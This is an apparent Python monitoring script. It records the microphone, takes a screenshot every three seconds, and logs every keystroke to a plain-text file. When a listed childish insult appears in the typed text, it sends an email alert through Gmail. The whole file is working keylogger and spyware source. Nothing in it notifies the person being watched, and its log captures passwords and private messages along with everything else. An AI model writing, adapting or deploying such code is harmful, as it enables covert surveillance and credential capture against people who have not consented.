import sounddevice as sd
from scipy.io.wavfile import write
from pynput.keyboard import Key, Listener
import time
import threading
import os
from PIL import ImageGrab
import smtplib
from email.message import EmailMessage

# Configuration
microphone_time = 10
audio_information = "data/audio.wav"
key_information = "data/key_log.txt"
screenshot_folder = "data/pictures"
time_iteration = 15
number_of_iterations_end = 2

sensitive_words = {
    "stupid", "dumb", "idiot", "jerk", "loser", "shut up", "crap", "buttface",
    "poopy", "booger", "dork", "weenie", "fart", "lame", "dummy", "doofus",
    "noob", "sucks", "moron", "nerd", "punk", "cheater", "lazy", "goofy",
    "blockhead", "dunce", "chicken", "slowpoke"
}
stop_event = threading.Event()

# Ensure screenshot directory exists
os.makedirs(screenshot_folder, exist_ok=True)

def send_alert_email(detected_word):
    sender_email = ""
    receiver_email = ""
    password = ""  # App password

    msg = EmailMessage()
    msg["Subject"] = "ALERT: Sensitive Word Detected"
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg.set_content(f"The word '{detected_word}' was detected in the key logs. Please check the logs for details.")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, password)
            server.send_message(msg)
        print("Alert email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Microphone recording function
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audio_information, fs, myrecording)

def take_screenshots():
    screenshot_count = 1
    while not stop_event.is_set():
        screenshot_path = os.path.join(screenshot_folder, f"screenshot{screenshot_count}.jpeg")
        im = ImageGrab.grab()
        im.save(screenshot_path)
        print(f"Saved: {screenshot_path}")
        screenshot_count += 1
        time.sleep(3)

def keylogger():
    current_time = time.time()
    stopping_time = current_time + time_iteration
    buffer = ""

    def on_press(key):
        nonlocal buffer
        key_str = str(key).replace("'", "")
        print(key)

        with open(key_information, "a") as f:
            if "space" in key_str:
                f.write("\n")
                buffer += " "
            elif "Key" not in key_str:
                f.write(key_str)
                buffer += key_str

        for word in sensitive_words:
            if word in buffer.lower():
                send_alert_email(word)
                buffer = ""

    def on_release(key):
        if key == Key.esc:
            return False

    while not stop_event.is_set():
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

if __name__ == "__main__":
    stop_event.clear()  # Ensure stop flag is not set
    
    microphone_thread = threading.Thread(target=microphone, daemon=True)
    microphone_thread.start()

    screenshot_thread = threading.Thread(target=take_screenshots, daemon=True)
    screenshot_thread.start()

    keylogger_thread = threading.Thread(target=keylogger, daemon=True)
    keylogger_thread.start()

    # Run everything for 30 seconds
    time.sleep(30)
    stop_event.set()  # Signal threads to stop

    print("Time limit reached. Stopping all operations.")

